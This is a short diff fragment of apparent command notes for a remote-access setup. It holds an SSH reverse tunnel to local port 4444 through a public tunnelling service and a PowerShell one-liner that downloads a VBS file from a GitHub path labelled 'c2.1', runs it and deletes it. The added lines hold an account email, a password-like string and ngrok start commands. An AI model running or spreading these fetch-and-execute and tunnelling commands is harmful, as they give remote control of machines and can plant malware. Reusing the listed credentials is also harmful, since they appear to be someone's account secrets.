@@ -12,3 +12,8 @@ ssh -p 443 -R0:localhost:4444 tcp@free.pinggy.io | tee pinggy.txt
 cat pinggy.txt
 
 powershell -c "$p=[IO.Path]::Combine($env:TEMP, 's.vbs'); iwr 'https://raw.githubusercontent.com/gaca9302/usb/refs/heads/main/c2.1/s.vbs' -OutFile $p; Start-Process wscript.exe $p -Wait; rm $p"
+
+kocoma7645@amupx.com
+SYHPa88EGLp_3#3
+win r %USERPROFILE%\AppData\Local\ngrok
+ngrok start my_app
